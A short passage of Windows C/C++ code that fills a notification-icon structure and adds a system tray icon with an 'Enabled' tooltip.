	nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	nid.uCallbackMessage = WM_TRAYICON;
	nid.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_DISABLED));
	strcpy_s(nid.szTip, "Enabled");

	Shell_NotifyIconA(NIM_ADD, &nid);
}
